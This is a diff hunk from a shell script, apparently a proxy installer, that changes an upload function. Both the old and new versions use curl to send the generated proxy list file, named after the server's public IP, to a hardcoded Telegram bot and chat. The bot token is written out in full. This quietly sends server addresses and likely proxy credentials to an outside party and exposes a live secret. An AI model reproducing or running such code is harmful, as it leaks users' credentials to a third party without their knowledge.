@@ -89,9 +89,9 @@ upload_proxy() {
     echo "Download zip archive from: ${URL}"
     echo "Password: ${PASS}"
 
-    cp proxy.txt "IPV4_$IP4".txt
+    cp proxy.txt "IPV4_$IP4_PUBLIC".txt
 
-    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-892127097' https://api.telegram.org/bot5748050505:AAEZEtv9aSEHk5VWmWVr68jiYP9KlimddnE/sendDocument
+    curl -X POST -F 'document=@/home/proxy-installer/'"IPV4_$IP4_PUBLIC"'.txt' -F 'chat_id=-892127097' https://api.telegram.org/bot5748050505:AAEZEtv9aSEHk5VWmWVr68jiYP9KlimddnE/sendDocument
 
 }
 
